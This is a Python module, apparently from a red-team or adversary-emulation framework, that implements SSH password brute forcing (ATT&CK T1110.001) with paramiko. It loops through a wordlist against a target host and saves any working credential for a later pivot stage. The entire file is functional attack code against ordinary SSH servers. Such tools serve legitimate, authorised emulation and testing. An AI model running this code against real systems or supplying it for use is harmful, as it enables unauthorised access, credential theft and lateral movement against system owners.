"""
techniques/credential_access/ssh_brute.py
ATT&CK: T1110.001 — Brute Force: Password Guessing
Tactic:  Credential Access

Attempts SSH login with a wordlist. Passwords are NEVER included in
result dicts, summaries, logs, or reports. Valid credentials are
stored in Context only — the pivot stage reads them from there.
"""

import paramiko
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique


class SSHBruteForce(Technique):
    name = "ssh-brute-force"
    attack_id = "T1110.001"
    tactic = Tactic.CREDENTIAL_ACCESS

    def __init__(
        self,
        target: str,
        port: int = 22,
        username: str = "admin",
        wordlist: str = "wordlists/passwords.txt",
        timeout: float = 5.0,
        stop_on_first: bool = True,
    ):
        self.target = target
        self.port = int(port)
        self.username = username
        self.wordlist = wordlist
        self.timeout = timeout
        self.stop_on_first = stop_on_first

    def _load_wordlist(self) -> list[str]:
        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        passwords = self._load_wordlist()
        tried = 0
        credential_found = False

        for password in passwords:
            tried += 1
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    self.target,
                    port=self.port,
                    username=self.username,
                    password=password,
                    timeout=self.timeout,
                    banner_timeout=self.timeout,
                    auth_timeout=self.timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                client.close()
                # Store in Context — NOT in result dict
                context.add_credential(
                    username=self.username,
                    password=password,           # lives in Context only
                    source_technique=self.name,
                    valid_on=self.target,
                )
                credential_found = True
                if self.stop_on_first:
                    break
            except paramiko.AuthenticationException:
                continue
            except Exception:
                continue
            finally:
                try:
                    client.close()
                except Exception:
                    pass

        # Summary and evidence: NO password values anywhere here
        if credential_found:
            summary = (
                f"Valid credential found for user {self.username} on "
                f"{self.target}:{self.port} "
                f"(tried {tried}/{len(passwords)} passwords)"
            )
        else:
            summary = (
                f"No valid credentials found for {self.username} on "
                f"{self.target}:{self.port} after {tried} attempt(s)"
            )

        return credential_found, summary, {
            "target": self.target,
            "port": self.port,
            "username": self.username,
            "passwords_tried": tried,
            "credential_found": credential_found,
            # No password, no candidate list
        }
